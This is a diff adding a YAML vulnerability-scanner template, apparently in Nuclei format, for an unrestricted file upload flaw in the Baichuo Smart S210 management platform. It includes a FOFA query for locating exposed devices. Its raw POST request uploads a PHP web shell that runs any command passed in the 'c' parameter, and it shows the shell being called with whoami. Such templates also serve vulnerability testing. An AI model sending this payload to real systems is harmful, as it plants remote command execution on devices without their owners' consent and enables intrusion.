@@ -1,0 +1,106 @@
+id: poc-pv65rg75k369gpcg
+info:
+  name: 北京百绰智能S210管理平台uploadfile.php无限制上传漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pv65rg75k369gpcg'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: pv65rg75k369gpcg
+    fofa: title="Smart管理平台"
+http:
+- raw:
+  - 'POST /Tool/uploadfile.php? HTTP/1.1
+
+
+    Cookie: PHPSESSID=fd847fe4280e50c2c3855ffdee69b8f8
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Content-Type: multipart/form-data; boundary=---------------------------13979701222747646634037182887
+
+
+    Upgrade-Insecure-Requests: 1
+
+
+    Sec-Fetch-Dest: document
+
+
+    Sec-Fetch-Mode: navigate
+
+
+    Sec-Fetch-Site: same-origin
+
+
+    Sec-Fetch-User: ?1
+
+
+    Te: trailers
+
+
+    Connection: close
+
+
+
+
+    -----------------------------13979701222747646634037182887
+
+
+    Content-Disposition: form-data; name="file_upload"; filename="contents.php"
+
+
+    Content-Type: application/octet-stream
+
+
+
+
+    <?php
+
+
+    system($_GET["c"]);
+
+
+    ?>
+
+
+    -----------------------------13979701222747646634037182887
+
+
+    Content-Disposition: form-data; name="txt_path"
+
+
+
+
+    /home/dudesite.php
+
+
+    -----------------------------13979701222747646634037182887--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    /home/dudesite.php?c=whoami'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
